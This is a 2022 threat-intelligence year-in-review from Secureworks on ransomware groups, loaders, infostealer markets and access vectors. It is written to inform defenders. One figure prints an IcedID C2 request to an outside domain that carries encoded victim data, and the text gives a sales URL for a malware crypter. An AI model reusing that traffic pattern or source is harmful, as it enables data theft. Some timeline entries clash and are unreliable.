# State of the Threat: A Year in Review (2022)
Organization: Secureworks

## Table of Contents
- [Letter From Our Chief Threat Intelligence Officer (CTIO)](#letter-from-our-chief-threat-intelligence-officer-ctio)
- [Executive Summary and Key Findings](#executive-summary-and-key-findings)
- [Ransomware Remains the Primary Strategic Threat](#ransomware-remains-the-primary-strategic-threat)
- [Ransomware Enablers: Loaders and Infostealers](#ransomware-enablers-loaders-and-infostealers)
- [Exploitation of Remote Services is Now the Most Common Access Vector](#exploitation-of-remote-services-is-now-the-most-common-access-vector)
- [Hostile Government-Sponsored Actor Activity Shows a Regional Focus](#hostile-government-sponsored-actor-activity-shows-a-regional-focus)
- [Defense Evasion Offers Its Own Detection Opportunities](#defense-vasion-offers-its-own-detection-opportunities)
- [Conclusion](#conclusion)
- [The Secureworks View of the Threat](#the-secureworks-view-of-the-threat)

---

## Letter From Our Chief Threat Intelligence Officer (CTIO)

The last twelve months have featured a series of headline-grabbing cybersecurity events. In December 2021, disclosure of a vulnerability in the popular Log4j software caused global panic as IT teams scrambled to find and patch vulnerable systems. In early 2022, the Russian military build-up on the Ukrainian border and subsequent invasion raised the specter of disruptive cyberattacks that might spill beyond Ukraine’s borders, as happened with NotPetya in 2017. And in mid-April, Conti ransomware knocked offline several Costa Rican government institutions, severely disrupting their ability to effectively deliver public services.

Our job is to dig beneath these headlines to understand the nature of the threat and mitigate the risk to our customers. We do that through up-to-date threat intelligence that is fueled by data-driven detection and analysis. The Secureworks® Counter Threat Unit™ (CTU) continues to analyze trillions of security events every week, gathered from its Taegis™ XDR platform. Together with the data processed through the Taegis Vulnerability Detection and Response (VDR) solution, proactive research, and insights gathered through engagements carried out by the Secureworks Incident Response team, this combines to create one of the most comprehensive views of the threat landscape in the industry.

The purpose of this report is to share our view on how the threat landscape has evolved over the last twelve months, with a clear focus on our first-hand observations of threat actor tooling and behaviors. The report reviews changes in the ransomware landscape, and in the behavior of threat actors enabling ransomware groups with malware like loaders and stealers. It surveys significant activity by major government-sponsored threat groups. And it examines how threat actors move swiftly to exploit new vulnerabilities, and how they combine sophisticated with more basic techniques to evade detection by defenders once inside the network. The report concludes by examining how Taegis forms the backbone of this visibility.

Across Secureworks, different teams work together to protect our customers. Our CTU™ research teams invest countless hours in developing an understanding of the threat and how it might manifest, and then in building ways to detect that threat which can be applied to our Taegis XDR and VDR platforms. Our Security Operations teams act as the watchful guardian of our customer networks, monitoring constantly for any changes that might indicate malicious activity. Our Incident Response team stands ready to support customers through the provision of proactive training, to help them prepare; and through reactive support to investigate, contain and remediate where breaches do occur. And our Secureworks Adversary Group emulates adversary behaviors to help customers test how their control frameworks perform in realistic, intelligence-driven scenarios.

Human expertise works with the technical excellence of Taegis XDR and Taegis VDR to keep Secureworks customers safe on their security journey. We hope the insights embodied in this report help you to protect your organization.

Barry Hensley  
Chief Threat Intelligence Officer  
Secureworks

---

## Executive Summary and Key Findings

Over the past year, cybersecurity events have been heavily influenced by escalating tensions in eastern Europe and the Middle East, a steady stream of critical vulnerabilities forcing organizations to scramble to patch their systems, and public leaks exposing the inner workings of organized cybercriminal ransomware gangs.

The role of the Secureworks Counter Threat Unit is to maintain an understanding of these diverse threats and apply that understanding to inform and protect customers. Between the end of June 2021 and June 2022, based on insights from customer telemetry, incident response, underground monitoring, proactive threat research and intelligence relationships, CTU researchers observed the following high-level trends across the threat landscape:

1. **Ransomware remains the primary threat facing organizations.** Detection strategies should focus on identifying ransomware precursors during the 'detection window' between initial access and ransomware deployment. The median detection window in 2022 is four and a half days.
2. **There has been flux in the loader landscape**, with the disappearance of some established loaders and the emergence of new ones. As the malware that loads second-stage payloads like ransomware, loaders form a key component of the ransomware ecosystem. There is evidence of close collaboration between the groups operating these loaders, and signs of a possible shift towards lightweight, disposable loaders in place of the complex botnets that up until now have provided this loader capability.
3. **Infostealers provide the means to quickly and easily obtain credentials** that can be used for initial access, making them a major enabler of ransomware operations. On a single day in June 2022, CTU researchers observed over two million credentials obtained by infostealers available for sale on just one underground marketplace. Innovative distribution methods for infostealers have included cloned websites and trojanized installers for messaging apps such as Signal.
4. **Based on learnings[^1] from Secureworks incident response engagements, exploitation of remote services has replaced credential-based access** as the most common initial access vector, stressing the need for effective vulnerability management and prioritization.
5. **Nation-state activity has been heavily focused on regional considerations.** Notable examples include Russia's cyber operations in support of the invasion of Ukraine, disruptive reciprocal attacks likely conducted by Iranian and Israeli proxy actors, and China's continued focus on the South China Sea and East Asia.
6. **Defense evasion is a feature of many network intrusions.** However, the techniques used are generally not very sophisticated, because they do not need to be. This provides additional detection opportunities.

---

## Ransomware Remains the Primary Strategic Threat

The composition of the global ransomware landscape and the number of victims continue to fluctuate. Yet overall, despite a series of high-profile law enforcement interventions and public leaks, ransomware operators have maintained high levels of activity.

Analysis of Secureworks incident response engagements for May and June 2022 appears to suggest that the rate at which new, successful ransomware attacks are happening is reducing, although it is too early to say if this trend will continue.

- **MAY 2021**: DarkSide affiliate ransomware attacks Colonial Pipeline
- **AUGUST 2021**: DarkSide group rebrands as BlackMatter
- **JUNE 2021**: U.S. Department of Justice (DOJ) recovers $2.3 million USD of the Colonial Pipeline ransom; Kaseya ransomware attack by REvil affiliate
- **JULY 2021**: Kaseya ransomware attack by REvil affiliate
- **AUGUST 2021**: Conti playbook leaks describe operating methodology of Conti affiliate
- **OCTOBER 2021**: REvil shuts down following law enforcement operation
- **NOVEMBER 2021**: DOJ unseals indictment of Alla ‘Max’ Witte, a developer of TrickBot malware, a key ransomware enabler
- **DECEMBER 2021**: Law enforcement takedowns of popular underground platforms Raid Forums and Hydra Market
- **FEBRUARY 2022**: Conti Leaks provide insight into inner workings of the operation; Emotet resurrected after January 2021 law enforcement takedown
- **MARCH 2022**: TrickBot abandoned
- **APRIL 2022**: REvil briefly returns; Operation TOURNIQUET closes RaidForums
- **JUNE 2022**: Conti operation shut down

_Figure 1. Key developments in the ransomware landscape, June 2021 - June 2022. (Source: Secureworks)_

The demise of GOLD ULRICK's[^2] Conti ransomware-as-a-service operation could account for some of this reduction, but not all. Other factors influencing the rate of attacks might include the disruptive effect on ransomware gangs of the war in Ukraine, economic sanctions designed to create friction for ransomware operators trying to cash in on their attacks, and the volatility of the digital currencies through which ransomware gangs realize their profits.

However, there could be something else going on. There is no corresponding trend of a year-on-year reduction in the number of organizations listed on public ransomware leak sites (figure 2). And CTU researchers are investigating whether there is a general trend in the size of those victim organizations reducing over time. Smaller organizations are likely to be less well resourced, making them a softer target and one that is less likely to bring in specialist incident response services after the event. And some ransomware gangs may have decided that hitting higher numbers of smaller organizations is less likely to provoke a strong law enforcement response than hitting large, global brands. Unfortunately, smaller organizations may also be less familiar with the mechanism for reporting to and accessing support from law enforcement and specialist security vendors, meaning that the true impact of ransomware will continue to be under reported and victims will not receive the support they need.

Regardless of the overall trend, for any individual organization ransomware remains a major threat and one that feeds on gaps in security control frameworks. Examination of Secureworks threat research and incident response data provides insights into the tactics of individual threat groups and highlights lessons that can help organizations better protect themselves.

![Publicly listed ransomware victims by month graph]
_Figure 2. Publicly listed ransomware victims by month. (Source: Secureworks)_

### The Window of Opportunity for Network Defenders

During any network intrusion, there is a window of opportunity for defenders. This happens between the point of initial access and the encryption of data when the threat actors are consolidating their access prior to achieving their ultimate objective. So far in 2022, the median time between initial access and ransomware detonation in intrusions investigated by Secureworks incident responders is **4.5 days**, compared to 5 days in 2021. The mean dwell time in 2021 was 22 days but so far in 2022 is down at 11 days, reflecting that there have been fewer 'outliers' compared to 2021, i.e. intrusions where threat actors spent weeks or months in an environment before deploying their ransomware.

Of course, this dwell time can vary significantly. In early 2022, an organization exposed a computer in an operational technology (OT) environment to the internet with the firewall disabled to troubleshoot network connectivity issues and download patches. Within five hours the computer had been compromised and within a further hour, the threat actors had disabled Windows Defender and deployed Phobos ransomware. While only a small number of devices were affected and the network was isolated from the rest of the organization, the intrusion was sufficient to temporarily disrupt business operations at that location.

In contrast, analysis of a Lorenz ransomware attack in September 2021 showed that the threat actors, tracked by CTU researchers as GOLD LOUNGE[^3], had access for almost a year. The initial intrusion likely occurred in October 2020, with GOLD LOUNGE periodically re-accessing the compromised environment to run reconnaissance commands, occasionally rotating the remote IP address they connected in from. They made extensive use of SMBExec to move laterally to other hosts within the environment. In September 2021, GOLD LOUNGE staged Lorenz ransomware in the SYSVOL directory of several compromised domain controllers and created scheduled tasks with random names on target systems to download and execute the ransomware. They then deleted volume shadow copies and cleared the security event log. One hypothesis to explain this lengthy delay is that GOLD LOUNGE purchased access from an initial access broker (IAB) long after the IAB first obtained it.

Regardless of the length of the detection window, network defenders can and should exploit it. On numerous occasions, Taegis XDR countermeasures have alerted customers to ransomware precursors in their environment, allowing them to isolate impacted hosts, block the command-and-control infrastructure, and reset compromised credentials before the threat actors can capitalize on the access. The difference in terms of time to recovery, total costs incurred and business disruption, compared to organizations who did not spot the threat in time, can be huge.

### Prevent Where You Can, and Detect What Can’t Be Prevented

Undoubtedly, the best way to protect your organization against ransomware deployment is to prevent or detect the initial breach.

This requires a tight focus on good, basic security hygiene:
- Ensure that all external and key internal systems are protected with multi-factor authentication (see chapter 5 for tips on avoiding pitfalls).
- Implement a timely vulnerability detection and patching program (see more about vulnerabilities in chapter 3).
- For those situations where prevention fails, visibility of the environment is critical. You can't protect what you can't see. Trying to develop that visibility after you've identified a breach is too late.
- Deploy a comprehensive monitoring and detection solution on all endpoints, network, and cloud (see the appendix for important monitoring considerations).

- **3%**: Commodity malware infection
- **2%**: Drive by download
- **2%**: Phishing
- **2%**: Network misconfiguration
- **39%**: Credentials
- **52%**: Exploitation of remote services

_Figure 3. Initial access vectors for ransomware incidents, June 2021 - June 2022. (Source: Secureworks)_

### New Players, Old Players

During the reporting period new ransomware groups appeared, many only briefly or with little impact, while others apparently disappeared. In some cases, this fluctuation represented a rebrand by established ransomware groups, possibly to minimize law enforcement and media scrutiny, and in some cases to disguise their identity in response to financial sanctions. In others, it may have been a result of the shifting allegiance of affiliates in the hunt for more victims and greater revenues.

| Ransomware Family | Jul 2021 | Aug 2021 | Sept 2021 | Oct 2021 | Nov 2021 | Dec 2021 | Jan 2022 | Feb 2022 | Mar 2022 | Apr 2022 | May 2022 | Jun 2022 | TOTAL |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **LockBit** | 56 | 76 | 83 | 86 | 91 | 54 | 45 | 76 | 98 | 94 | 71 | 45 | 875 |
| **Conti** | 23 | 27 | 28 | 53 | 96 | 36 | 11 | 34 | 73 | 43 | 12 | - | 436 |
| **BlackCat / ALPHV** | - | - | 15 | 12 | 24 | 21 | 32 | 15 | 15 | - | - | - | 134 |
| **Hive** | - | 15 | 19 | 28 | 7 | 16 | 7 | 9 | 21 | 5 | 15 | 5 | 129 |
| **AvosLocker** | 8 | 5 | 8 | 10 | 15 | 9 | 4 | 3 | 3 | 5 | - | 11 | 81 |
| **Vice Society** | 3 | 3 | 6 | 4 | 2 | 4 | 8 | 10 | 17 | 10 | 12 | - | 79 |
| **Grief** | - | 11 | 4 | 7 | 18 | 10 | 11 | 8 | - | - | - | - | 69 |
| **BlackByte** | - | - | 2 | 7 | 12 | 13 | 6 | - | 9 | 5 | 4 | 5 | 65 |
| **Black Basta** | - | - | - | - | - | - | - | - | - | 11 | 22 | 18 | 51 |
| **Lorenz** | 4 | 2 | - | - | 3 | 1 | - | 4 | 6 | 7 | 1 | - | 28 |
| **REvil** | 11 | - | 3 | 3 | - | - | - | - | - | 3 | 2 | - | 22 |

_Figure 4. Major ransomware schemes active during the period, showing number of victims per month. (Source: Secureworks)_

### Law Enforcement Actions

Over the reporting period, there have been several significant law enforcement actions or sanctions aimed at disrupting ransomware operators or their access to supporting services such as cryptocurrency money laundering.

- U.S. Treasury OFAC sanctions[^4] in December 2019 targeting GOLD DRAKE[^5], also known as Evil Corp, have led to the threat group repeatedly changing ransomware variants to complicate attribution of their attacks back to them, so that victims do not find themselves prohibited from paying the ransom. During the reporting period, they switched between several ransomware families including WastedLocker, Macaw, and potentially also LockBit[^6].
- In April 2022, OFAC sanctioned Hydra Market (Hydra), the world's largest darknet market. OFAC identified that approximately $8 million in ransomware proceeds had been laundered through it. It also sanctioned Garantex, a virtual currency exchange registered in Estonia thought to have processed transactions worth nearly $6 million from GOLD ULRICK's Conti operation.
- In May, OFAC sanctioned virtual currency mixer[^7] Blender.io (Blender), which had allegedly obscured transactions for Russian cybercrime groups including GOLD ULRICK and GOLD BLACKBURN[^8], and for North Korean threat actors.
- Also in May[^9], the U.S. State Department offered a financial reward for information leading to the arrest of senior members of the Conti ransomware operator.

Action aimed at supporting services included the U.S. Department of Justice unveiling[^10] an indictment filed in 2020 against Latvian national Alla Witte for her role as a malware developer in the operation of TrickBot. Chats contained in the Conti Leaks[^11] showed GOLD BLACKBURN allocating funds for finding a lawyer to represent Witte.

RaidForums, used to sell databases containing billions of card and banking details, as well as login credentials, also closed in April, as the result of Operation TOURNIQUET[^12], a complex law enforcement effort coordinated by Europol. The site was closed, its infrastructure seized, and its administrator and his accomplices arrested.

The long-term impact of increased law enforcement activity against ransomware operators remains difficult to judge. The process of having to re-brand undoubtedly introduces cost for ransomware actors, including potentially through the loss of affiliates to other RaaS schemes. And many victims do hesitate to pay ransoms to sanctioned groups. However, ransomware groups have shown an ability to recover from disruptive interventions and identify alternative means of sustaining their operations. The lack of cooperation from countries where core members of the prominent ransomware groups reside continues to hamper disruption efforts.

### The (Non) Return of REvil

On April 19, 2022, CTU researchers observed two dormant Tor sites associated with REvil become active again. Both sites were redirecting to a new Tor site that appeared to be a revamp of the original REvil leak site. The new leak site retained the original list of victims, as well as three new victims. This was odd, given that GOLD SOUTHFIELD[^15] initially went offline shortly after the Kaseya attack[^16] that occurred over Independence Day weekend in July 2021 and then was forced offline permanently by a collaborative law enforcement[^17] effort in October.

Naturally, the use of the same Tor infrastructure and REvil source code caused speculation about whether REvil was back, despite the reported[^18] arrest of members of the group by the Russian FSB in January 2022. But in spite of these early signs of a resurgence, REvil is yet to reach its former level of activity.

Intriguingly, CTU researchers identified[^19] REvil samples compiled in March at a time when, according to the Russian authorities, members of the group were still in custody[^20]. This could indicate that the individuals had been quietly released prior to that point, or perhaps the arrests were of fringe members and had no real impact on the group's operational capabilities. The timing also coincides with the breakdown of cooperation between Russia and the U.S. on cybercrime.

> **The Perils of Timestamps—Can They Be Trusted?**
> Analysis of REvil's resurgence relied in part on analysis of compilation timestamps. Compilation timestamps show when a file, in this case a REvil ransomware binary, was created and can be useful for building a timeline of threat actor activity. But they can, and often are, falsified by threat actors. Threat intelligence analysts need to be careful in relying on them.
> 
> CTU researchers have been tracking GOLD SOUTHFIELD since 2019 and have processed thousands of REvil samples. Whenever a new version of REvil has appeared, the compilation timestamp for the executable aligns with what is expected of a new release. Compilation timestamps also align for samples across multiple different campaigns. Therefore, while compilation timestamps should generally be treated cautiously, in this case they are a useful data point.

### ALPHV Works Cross-Platform

It is increasingly common for ransomware groups to compile ransomware that can be deployed across multiple operating systems. One example is GOLD BLAZER's[^21] ALPHV ransomware, also known as BlackCat, which emerged in December 2021. Based on insights from multiple ALPHV intrusions worked by Secureworks incident responders, the operators move from initial infection to data exfiltration within a few days, to deploying ransomware within approximately one week. In one incident, GOLD BLAZER or one of its affiliates abused a single-factor authentication Virtual Private Network (VPN) for the initial infection vector. After compromising the device, the threat actors conducted reconnaissance and used Mimikatz to harvest credentials. Using these stolen credentials, the threat actors logged into domain administrator accounts and used the access to stage, compress, and exfiltrate files.

ALPHV is written in Rust, making the ransomware scalable across Windows and Linux operating systems without needing to maintain distinct codebases. Its configuration file (figure 5) includes options to terminate ESXi 'vm' and 'vm snapshot' files. The hybrid approach of listing Linux and Windows file extensions is unusual.

![ALPHV configuration file screenshot]
_Figure 5. ALPHV configuration file. (Source: Secureworks)_

### Hive Proves Effective at Attracting Affiliates

Hive is another ransomware that has featured heavily in incident response engagements worked by Secureworks during the period. The operators of the Hive RaaS, GOLD HAWTHORNE[^22], have been active since at least June 2021.

Since April 2022, CTU researchers have attributed a series of Hive-related intrusions to a single affiliate, GOLD MATADOR[^23]. GOLD MATADOR gains access to networks through VPN or Remote Desktop Protocol (RDP) servers using compromised credentials. After conducting reconnaissance to enumerate domains and harvest credentials using tools like PCHunter64, SharpView and Mimikatz, the group moves laterally using RDP with stolen credentials. The SystemBC proxy tool is used to disguise network traffic and Cobalt Strike Beacon is installed across number hosts for command and control. The group explores directories and views specific files before using FileZilla for data exfiltration and then ultimately deploying the Hive ransomware via Group Policy Object or Scheduled Task (figure 6).

![Scheduled Task veeamupdate screenshot]
_Figure 6. Scheduled Task (veeamupdate) used by GOLD MATADOR to detonate Hive ransomware. (Source: Secureworks)_

### Experimentation With Hack and Leak Continues

The Secureworks 2021 State of the Threat report highlighted hack and leak incidents (where no ransomware was deployed) as a potential shift away from the traditional ransomware-based extortion model. It remains unclear whether this approach provides a viable long-term business model, but some groups such as GOLD TOMAHAWK[^24] continue to practice it. Also known as Karakurt Team or Karakurt Lair, GOLD TOMAHAWK has been active since mid-2021.

GOLD TOMAHAWK intrusions typically start with access through internet-facing VPN endpoints, likely leveraging vulnerabilities or weak or stolen credentials. Once inside the network, GOLD TOMAHAWK does not deploy custom tooling, relying instead on off-the-shelf tools and applications, often native to the victim system, to meet its objectives. The threat group has been observed to use RDP for lateral movement, AnyDesk for remote access, 7-Zip to compress data for extraction, and the Mega and QuickPacket file-upload services for exfiltration.

Another hack and leak actor that emerged during the period is the GOLD RAINFOREST[^25] (Lapsus$) threat group, who claimed responsibility for several high-profile breaches including against Microsoft, Samsung and Nvidia. Identified members of GOLD RAINFOREST don’t match the typical stereotype of Russian-organized cybercriminals. But the success they were able to achieve in a short space of time is a cautionary tale about the importance of understanding how easy it can be for threat actors with a moderate level of capability and, critically, a means of accessing an organization's network to carry out attacks.

![GOLD TOMAHAWK leak site screenshot]
_Figure 7. GOLD TOMAHAWK (Karakurt) leak site screenshot. (Source: Secureworks)_

---

## Ransomware Enablers: Loaders and Infostealers

Malware distribution forms a key component of the broad infrastructure that both supports and fuels the ransomware ecosystem. Delivery techniques continue to evolve, and the relationship between established ransomware operators and malware distribution operators remains a close one.

### Now You See Them, Now You Don't

Between July 2021 and June 2022, two big names in the loader landscape disappeared and two returned, demonstrating that writing off botnets and their associated malware, even after periods of inactivity, can be premature.

Emotet returned in November 2021, following its January 2021 takedown by international law enforcement agencies. During this downtime, its developers, tracked as the GOLD CRESTWOOD[^26] threat group, had made some changes. The Emotet code appeared enhanced and streamlined, with more modern cryptography, different communications protocols, a switch to 64-bit architecture, more customizable execution options, and new command and control (C2) infrastructure. CTU researchers also observed evidence of GOLD CRESTWOOD experimenting with re-implementing deprecated functionality such as modules to steal credit card information from web browsers and self-propagation[^27] using SMB and a list of hardcoded credentials.

Conti operator GOLD ULRICK was likely instrumental[^28] in Emotet’s return, and the Conti Leaks provided evidence of the close relationship between the ransomware group and GOLD CRESTWOOD. Emotet reappeared as a DLL download from TrickBot, suggesting that GOLD CRESTWOOD aimed to rebuild the Emotet botnet by using long-time collaborator GOLD BLACKBURN's TrickBot infrastructure. Emotet was also distributed through malicious Windows App Installer packages disguised as Adobe PDF software, much like GOLD BLACKBURN's BazarBackdoor malware. In January 2022, CTU researchers observed Emotet executing reconnaissance commands (see figure 8) replacing functionality that was previously provided by intermediate payloads Qakbot and TrickBot.

![Emotet executing reconnaissance commands screenshot]
_Figure 8. Emotet executing reconnaissance commands and credential-theft tools. (Source: Secureworks)_

In March, Emotet resumed dropping Qakbot, using the 'azd' campaign ID which likely refers to a GOLD LAGOON[^29] affiliate. Qakbot had itself taken a two-month hiatus in 2021, reappearing on September 9, 2021. During the break, Qakbot's backend infrastructure was for the first time switched off rather than left to idle, leading the security community to question if the hiatus could be permanent. Since its return, Qakbot has resumed its role as a major player in the loader landscape.

On October 18, CTU researchers observed Qakbot deploying a new plugin containing the legitimate Atera remote management and monitoring (RMM) software to all infected devices (figure 9).

![msiexec.exe launching Windows installer screenshot]
_Figure 9. msiexec.exe launching the Windows installer file that installs the Atera RMM software. (Source: Secureworks)_

The TrickBot botnet stopped responding to infected systems on March 1, 2022, after a progressive decrease since mid-2021 in the tempo of updates to TrickBot-infected hosts via its C2 infrastructure. There were no signs of it returning to life by August, and it seems likely that the group intends to permanently abandon it.

- **JULY 31, 2021**: Last C2 server update to botnet segment disabled
- **OCTOBER 19, 2021**: Last C2 server update to botnet segment going offline
- **DECEMBER 6, 2021**: Web injects campaign
- **DECEMBER 20, 2021**: Last plugin update
- **DECEMBER 29, 2021**: Last observed Conti data leaks begin
- **FEBRUARY 20, 2022**: Aspects of C2 infrastructure start
- **FEBRUARY 27, 2022**: C2 infrastructure completely disabled
- **MARCH 1, 2022**: C2 infrastructure completely disabled

_Figure 10. Timeline of TrickBot activity from July 2021 through March 2022. (Source: Secureworks)_

The Conti Leaks may shed some light on the decision to abandon TrickBot, as they include conversations about TrickBot's declining utility and BazarLoader's increasing maturity. In a sign of the speed with which the threat landscape can change, by April 2022 a new loader called Bumblebee was being used in Conti and Diavol ransomware attacks in preference to BazarLoader. However, TrickBot's design means GOLD BLACKBURN retains the capability to re-enable the C2 infrastructure and recapture existing bots if the group chooses to.

There were lulls in IcedID activity between July and November 2021, and between February and May 2022, but activity levels have continued to increase since May 2022. In 2021 the operators of IcedID, GOLD SWATHMORE[^30], reworked the malware’s networking functionality to include Base64-encoded information about the victim system in the HTTP Cookie and Authorization header (figure 11).

```http
POST /news/1/255/0 HTTP/1.1
Host: coolbearblunts.com
Connection: Keep-Alive
Content-Type: application/octet-stream
Cookie: session=MDowOjA6MjIxMzQ6MA==
Authorization: Basic MzU2MDE4MjYwMDOxMDg2NDczMzAyOjEwNzo2Njoy
Content-Length: 416
...
```
_Figure 11. IcedID HTTP POST request with encoded victim information. (Source: Secureworks)_

Distribution for IcedID also changed during 2021, to distribute ISO files containing Windows shortcut (LNK) files that execute a colocated DLL file containing the IcedID payload. In a March 2022 intrusion, an attacker compromised an internet-facing Microsoft Exchange Server via the ProxyShell vulnerability and used access to the compromised server to send internal phishing emails containing hijacked email threads and an attached IcedID payload. This technique of using compromised email servers to send internal phishing emails is likely an effort to ensure that emails appear to come from a trusted sender, bypassing security controls that warn users by tagging emails that originate externally.

![Taegis XDR detection for IcedID malware screenshot]
_Figure 12. Taegis XDR detection for IcedID malware. (Source: Secureworks)_

### New on the Scene

There have been a number of new loaders that have emerged during the reporting period, and in some cases disappeared again. CTU researchers assess that the groups operating these loaders may move away from the complex, fully-featured botnets that evolved from the early banking trojans towards more lightweight loaders that are easier to develop and maintain. That shift is likely enabled by increased use of fully featured and actively maintained post-exploitation tools such as Cobalt Strike. The role of the loader is simply to achieve an initial access point, perhaps perform some basic reconnaissance such as checking that the infected host is joined to an Active Directory domain, and then retrieve and execute the post-exploitation tool.

#### Bumblebee
CTU researchers' analysis of Bumblebee reveals rapid development and numerous active campaigns. Multiple threat actors now appear to have moved to using Bumblebee to drop payloads that include Cobalt Strike, Sliver[^31], and Meterpreter in order to deliver ransomware.

#### PureCrypter
PureCrypter is a fully featured malware builder and loader advertised for sale since March 2021 at $59 USD for one month and $249 for lifetime use. It is a .NET executable obfuscated with SmartAssembly. It is widely used to drop payloads for cybercriminal ends. In addition, CTU researchers assess with moderate confidence that the developers of the WhisperGate[^32] file wiper that was deployed against targets in Ukraine prior to the Russian invasion used PureCrypter to generate the .NET code in both the loader and the initial payload.

![PureCrypter pricing screenshot]
_Figure 13. PureCrypt and associated tool pricing at https://purecoder.sellix.io/ (Source: Secureworks)_

#### SquirrelWaffle
SquirrelWaffle loader was first detected in September 2021, delivering Qakbot and Cobalt Strike. Initially, some third-party commentators characterized it as an heir to Qakbot, Emotet, or IcedID. However, by early November, SquirrelWaffle's infrastructure had been disabled and the loader was not observed again in active distribution. CTU researchers saw only a small number of SquirrelWaffle infections across customer environments (figure 14).

![iSensor IDS detection screenshot]
_Figure 14. iSensor IDS detection for SquirrelWaffle HTTP POST request that uses padding and a hardcoded XOR key. (Source: Secureworks)_

### Bringing the Victim to You: Drive-By-Download as an Alternative Distribution Method

'Drive-by-downloads' continue to be a popular alternative to phishing-based malware distribution. Notable examples include the prolific SocGholish malware framework, operated by GOLD PRELUDE[^33], and the Gootloader JavaScript-based loader distributed by the GOLD ZODIAC[^34] threat group. A user visits a compromised website that triages the visitor and serves up a series of redirects that ultimately deliver malware.

GOLD ZODIAC uses search engine optimization (SEO) poisoning, layers of public blog posts, and a complex array of compromised WordPress sites to drive high-ranking Google search results to deliver Gootloader. Professionals who visit these infected sites to download model legal agreements or other documents are tricked into downloading GootLoader, leading to the download of Cobalt Strike as a precursor to ransomware.

- User follows poisoned, high ranking Google search result to a GOLD ZODIAC compromised Wordpress site
- Code injected into compromised site checks the user has not visited before and that the browser is on allow list. If either is false, the user is presented a generic, non-malicious web page
- If both are true, the user is presented the hallmark Gootloader Q&A forum page containing a direct download link matching the original search term
- Download link redirects through a series of compromised sites to deliver a .zip file containing the Gootloader Javascript based loader
- When executed, the loader sends system information to a hard coded C2 domain, which checks whether the machine is Active Directory joined. If yes, the C2 server returns a payload and moves to the next stage of the infection
- Gootloader creates a scheduled task for persistence, stuffs multiple registry keys with encoded payloads. The scheduled task decodes and executes the payloads

_Figure 15. Gootloader process flow. (Source: Secureworks)_

![Compromised WordPress site screenshot]
_Figure 16. Compromised WordPress site. (Source: Secureworks)_

### Infostealers: A Thriving Market

Loaders are one way of gaining access to an environment. Another is using credentials obtained by infostealers, or 'stealers'. Analysis of the sale of 'logs' (collections of stolen data) on underground forums shows that stealers are becoming increasingly popular. On a single day in June 2022, over two million logs were offered for sale on a single underground forum (figure 17).

- **RedLine**: 2,884,269 total count
- **Azorult**: 1.7M
- **Vidar**: 849K
- **Raccoon**: 126K
- **Taurus**: 94K
- **Other**: 49K

_Figure 17. Logs from popular stealers for sale on Russian Market underground forum on June 2, 2022. (Source: Secureworks)_

The three main stealer markets are:
- Genesis Market
- Russian Market—likely tied to the now defunct Amigos market
- 2easy—claims to be the largest stealer market, but Russian Market and Genesis appear to host more logs.

#### Genesis Market
Active since 2018, Genesis is an online marketplace for stolen account data, offering custom bot software that allows customers to clone their victims' browsers, including cookies, usernames, and passwords. When a criminal buys an identity on the market, they buy access to the bot on the victim's computer, making it easy to hijack victims' online accounts. Access to the site, which operates on the dark web and the open internet, is via invitation. It is possible to search the logs by bot name, location, or domain.

#### Russian Market
Considered to be the largest active stealer market, Russian Market sells logs from multiple vendors. It is possible to search by stealer name, system, country, state, city, zip code, ISP, email address, vendor, or domain. Data on sale on June 2, 2022, originated from 226 different countries, and 510 different victim operating system versions. Russian Market also sells credit card information, RDP and SSH credentials, and PayPal accounts.

#### 2easy
2easy, which was first advertised in 2020, is a relatively new market compared to Genesis and Russian Market. It's less open than the Russian Market and requires an invitation code to join. Users can search by country, seller, creation date, price, or domain.

CTU researchers have seen an increase in the sale of network access sourced from credentials acquired by information stealers. Initial access brokers comb through the data to find credentials for remote access solutions at potentially high-value targets and then sell the access individually, usually at auction, for a large sum. Access to low-profile targets is sold in bulk in packages of as many as hundreds of thousands of compromised accounts at once, mostly for organizations located in the E.U., U.K., and U.S.

There is a plethora of stealers for sale on underground forums but some of the major ones include RedLine, Vidar, Raccoon, Taurus, and AZORult.

#### RedLine
RedLine harvests browser information such as credit card data and saved credentials. It also gathers system information, and more recent versions can steal cryptocurrency wallet data. In July 2021, CTU researchers saw RedLine in use in a campaign employing cloned websites with a travel or hotel theme to fool victims into downloading an executable with RedLine as the ultimate payload. Threat actors have also distributed RedLine via trojanized installers for messaging software such as Signal.

![Genesis Market listings screenshot]
_Figure 18. Listings on Genesis Market (Source: Secureworks)_

![Russian Market user interface screenshot]
_Figure 19. Russian Market user interface (Source: Secureworks)_

![2easy search options screenshot]
_Figure 20. Search options on 2easy (Source: Secureworks)_

#### Vidar
Vidar, written in C++, has typical stealer functionality combined with an unusual method of obtaining C2 IP address information by creating fake user profiles on social networks to post C2 IP addresses (figure 22). In 2021, it used gaming platforms for the same purpose. CTU researchers have seen Vidar dropping the popular SystemBC proxy malware on infected systems before self-deleting. In February 2022, Vidar was available to rent at prices between $130 for seven days and $750 for 90 days.

![Cloned website screenshot]
_Figure 21. Cloned website containing a security warning and download prompt for Redline payload. (Source: Secureworks)_

![Vidar using Mastodon screenshot]
_Figure 22. Vidar using Mastodon social network for C2. (Source: Secureworks)_

#### Raccoon
Raccoon stealer collects passwords, cookies, and browser autofill form data as well as system information and cryptocurrency wallets. In February 2022, it was being advertised for between $75 for seven days of use and $375 for two months.

The group responsible for Racoon announced[^35] in March 2022 that they were suspending development after one of its developers was killed during the Russian invasion of Ukraine. However, version 2 of Raccoon launched in May, and in June CTU researchers observed logs being offered for sale on Russian Market.

#### Taurus
Taurus is a stealer thought to have been developed by the threat actor behind the Predator the Thief malware. Offered for sale on underground forums, the Taurus developer claims that it can steal passwords, cookies, and autofill forms along with the history of Chromium- and Gecko-based browsers. It can also steal system configuration and software data, as well as some popular cryptocurrency wallets and commonly used FTP and email client credentials.

#### AZORult
AZORult steals passwords, cookies, cryptowallets, and files. Once one of the most prolific stealers, it is no longer in active development and is available to users for free. Its last version update was likely in December 2018.

### Business Email Compromise

While it does not capture the public attention in quite the same way, from a financial loss perspective business email compromise (BEC) continues to rank alongside ransomware as a major threat. According to the FBI, reported losses between October 2013 and December 2021 were over $43 billion USD[^36], with adjusted losses of $2.4 billion USD[^37] in 2021 alone, dwarfing the reported losses attributed to ransomware.

There are undoubtedly some issues around reporting that mean that ransomware losses have been significantly underrepresented, but Secureworks incident response data corroborates the FBI’s findings around the prevalence of BEC.

